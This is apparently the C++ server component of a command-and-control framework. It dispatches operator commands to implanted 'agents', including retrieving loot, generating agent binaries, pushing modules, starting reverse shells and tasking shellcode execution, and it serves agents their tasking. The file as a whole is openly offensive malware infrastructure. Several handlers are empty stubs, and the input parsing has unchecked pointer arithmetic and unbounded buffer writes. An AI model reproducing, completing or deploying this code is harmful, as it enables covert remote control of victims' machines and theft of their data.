#include "connection.h"

/*constructor for the connection instance*/
ConnectionInstance::ConnectionInstance(){
    int ret;
    char* last;
	char result[4096];
    char dir[4096];
    unsigned long index;
    struct stat st = {0};
    this->logger = new Log();
    this->list = new List();
    
    memset(result, 0, sizeof(result));
	memset(dir, 0, sizeof(dir));
	
    // seed random number generator
    srand(time(NULL));

	// gets current file path, so data will be written to correct folder regardless of where execution is called
	readlink( "/proc/self/exe", result, 4096);

	last = strrchr(result, '/');
	index = last - result;
	strncpy(dir, result, index);
	
	ret = chdir(dir);
	if(ret < 0){
		perror("Failed to change directory");
		exit(-1);
	}


    umask(0);

    // initialize base directories
    if (stat("agents", &st) == -1) {
        mkdir("agents", 0755);
        printf("Server: initialized directory 'agents'\n");
    }

    if (stat("out", &st) == -1) {
        mkdir("out", 0755);
        printf("Server: initialized directory 'out'\n");
    }

    if (stat(DATA_FILE, &st) == -1) {
        int fd2 = open(DATA_FILE, O_RDWR | O_CREAT, S_IRUSR | S_IRGRP | S_IROTH);
        printf("Server: initialized agent authentication file\n");
        close(fd2);
    }
}

/*Neato destructor*/
ConnectionInstance::~ConnectionInstance(){
    return;
}

/*Not implemented yet because why not?*/
void ConnectionInstance::get_info(char *ptr){
    return;
}

/*Handler for manager connections and flow*/
void ConnectionInstance::manager_handler(){
    pClientNode node = this->transport->get_node();
    
    int operation;
    int rc = 0;
    int quitting = 0;
    int count = 0;
    char *ptr = NULL;
    char *dat_ptr = NULL;
    char *d_ptr = NULL;
    char tmpbf[3] = {0,0,0};
    char tmpbuffer[8];
    char filename[2048];
    char resp[2048];
    char buff[BUFSIZ];
    char logbuff[BUFSIZ];
            
    // main instruction loop
    while (!quitting)
    {
        // reset variables for loop
        ptr = resp;
        operation = -1;
        rc = 0;
        dat_ptr = NULL;

        
        memset(buff, 0, sizeof(buff));
        memset(tmpbuffer, 0, sizeof(tmpbuffer));
        memset(filename, 0, sizeof(filename));
        memset(resp, 0, sizeof(resp));
        memset(logbuff, 0, sizeof(logbuff));
        
        // get operation request
        this->transport->read((char **)&resp);
        
        // parse it
        strncat(tmpbf,resp,2);
        operation = atoi(tmpbf);
        ptr += 3;

        sprintf(logbuff, "Manager %s: Operation caught: %d\n", node->data->id, operation);
        this->logger->log(logbuff);

        // TODO: FIX THIS?
        if(*ptr == '\0'){
            sprintf(logbuff, "Manager %s: Caught illegal operation option: NULL\n", node->data->id);
            this->logger->log(logbuff);
            this->transport->send_err();
            quitting = 1;
            continue;
        }

        // main switch
        switch (operation)
        {
        case MANAG_EXIT:
            this->list->remove_node(node);
            quitting = 1;
            break;

        case MANAG_GET_LOOT:
            transport->get_loot(ptr);
            break;

        case MANAG_UP_FILE:
            // Agent_id is stored in ptr
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                sprintf(logbuff, "Wrong format identified from input\n");
                this->logger->log(logbuff);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            
            transport->download_file(d_ptr, 1, dat_ptr);
            AgentInformationHandler::task(AGENT_DOWN_FILE, dat_ptr, d_ptr);
            break;

        case MANAG_REQ_RVSH:
            AgentInformationHandler::task(AGENT_REV_SHELL, dat_ptr, d_ptr);
            break;

        case MANAG_TASK_MODULE:
            // Agent_id is stored in ptr 
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                sprintf(logbuff, "Wrong format identified from input\n");
                this->logger->log(logbuff);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            
            transport->download_file(d_ptr, 1, dat_ptr);
            
            AgentInformationHandler::task(AGENT_EXEC_MODULE, dat_ptr, d_ptr);
            break;

        case MANAG_CHECK_LOOT:
            printf("Caught loot check call\n");
            break;

        case MANAG_DOWN_FILE:
            // requested agent and filename are stored in ptr
            // by the end, filename is in d_ptr and agent is in dat_ptr
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                sprintf(logbuff, "Wrong format identified from input\n");
                this->logger->log(logbuff);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            AgentInformationHandler::task(AGENT_UP_FILE, dat_ptr, d_ptr);
            this->transport->send_ok();
            break;

        case MANAG_TASK_SC:
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                sprintf(logbuff, "Wrong format identified from input\n");
                this->logger->log(logbuff);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));
            
            AgentInformationHandler::task(AGENT_EXEC_SC, dat_ptr, d_ptr);
            this->transport->send_ok();
            break;

        case MANAG_GET_AGENT:
            d_ptr = strchr(ptr, ':') +1;
            if(d_ptr == NULL){
                sprintf(logbuff, "Wrong format identified from input\n");
                this->logger->log(logbuff);
                return;
            }
            count = misc_index_of(ptr, ':', 0);
            dat_ptr = misc_substring(ptr, count, strlen(ptr));

            transport->make_agent(dat_ptr, d_ptr);
            dat_ptr = NULL;
            transport->upload_file("out/client.out", 0);
            break;

        case MANAG_REG_AGENT:
            printf("Caught agent register call\n");
            break;

        case MANAG_GET_INFO:
            this->get_info(ptr);
            break;

        case MANAG_REQ_PORTS:
            this->get_ports(ptr);
            break;

        case MANAG_CONN_RVSH:
            this->transport->init_reverse_shell();
            break;

        default:
            sprintf(logbuff, "Manager %s: Unknown operation value '%d'\n", node->data->id, operation); 
            this->logger->log(logbuff);
            this->transport->send_err();
            break;
        }
    }
    
}

/*Returns all available ports for accessing reverse shells*/
void ConnectionInstance::get_ports(char *ptr){

}

/*Place holder*/
void ConnectionInstance::reverse_shell(){}
/*Handles reverse shell connections and forwarding*/

/*Handler for agent connections and flow*/
void ConnectionInstance::agent_handler(){    
    // initialize variables
    int operation = 0;
    int rc = 0;
    int quitting = 0;
    char *ptr = NULL;
    char tmpbf[3] = {0,0,0};
    char tmpbuffer[8];
    char buff[2048];
    char filename[2048];
    char resp[2048];
    char logbuff[BUFSIZ];
    pClientNode node = transport->get_node();
            
    // enters main handler loop
    while (!quitting)
    {
        // reset buffers and variables on repeat
        ptr = resp;
        operation = -1;
        rc = 0;
        memset((void*)buff, 0, 2048);
        memset((void*)tmpbuffer, 0, 8);
        memset((void*)filename, 0, 2048);
        memset((void*)resp, 0, sizeof(resp));
        memset((void*)logbuff, 0, sizeof(logbuff));

        // gets the agent's requested tasking operation
        this->transport->read((char**)&resp);
        
        // parses operation into buffers
        //printf("Requested tasking: %s\n", resp);
        strncat(tmpbf,resp,2);
        operation = atoi(tmpbf);
        ptr += 3;
        
        /*
        Command data structure:
            First char: 
                Describes what command it is
            Following chars:
                Optional values, separated by ',' chars
            Terminating sequence:   
                NULL
        */

        sprintf(logbuff, "Client %s: Operation caught: %d\n", node->data->id, operation);
        this->logger->log(logbuff);

        // checks if illegal options 
        // TODO: FIX THIS???
        if(*ptr == '\0'){
            sprintf(logbuff, "Client %s: Caught illegal operation option: NULL\n", node->data->id);
            this->logger->log(logbuff);
            this->transport->send_err();
            quitting = 1;
            continue;
        }

        // main decision switch
        switch (operation)
        {
        case AGENT_EXIT:
            printf("Client %s: Client exiting...\n", node->data->id); 
            this->list->remove_node(node);
            quitting = 1;
            break;

        case AGENT_DOWN_FILE:
            sprintf(buff, "agents/%s/tasking/%s", node->data->id, ptr);
            transport->upload_file(buff, 0);
            break;

        case AGENT_UP_FILE:
            transport->download_file(ptr, 0, NULL);
            break;

        case AGENT_REV_SHELL:
            printf("Agent reverse shell caught\n");
            this->reverse_shell();
            break;

        case AGENT_EXEC_MODULE:
            sprintf(buff, "agents/%s/tasking/%s", node->data->id, ptr);
            transport->upload_file(buff, 1);
            break;

        default:
            sprintf(logbuff, "Client %s: Unknown operation value '%d'\n", node->data->id, operation); 
            this->logger->log(logbuff);
            this->transport->send_err();
            break;
        }
    }
}


/*Initialized the connection and prepares data structures for handlers*/
void *ConnectionInstance::handle_connection(void *input){
    class ConnectionInstance *instance = (class ConnectionInstance *)input;

    // creates classes and instances
    int handler = instance->transport->determine_handler();
    

    // determines handler to use
    if (handler == AGENT_TYPE)
    {
        printf("Starting agent handler\n");
        instance->agent_handler();
    } else if(handler == MANAG_TYPE)
    {
        printf("Starting manager handler\n");
        instance->manager_handler();
    } else
    {
        // failed to handle the parsing :)
        printf("Woops got an unknown type: %d\n", handler);
    }
}

/*Sets the transport for the connection instance*/
void ConnectionInstance::set_transport(class ServerTransport *transport){
    this->transport = transport;
}

/*returns the logger used by the instance*/
class Log *ConnectionInstance::get_logger(){
    return this->logger;
}

/*returns the list used by the instance*/
class List *ConnectionInstance::get_list(){
    return this->list;
}

class ServerTransport *ConnectionInstance::get_transport(){
    return this->transport;
}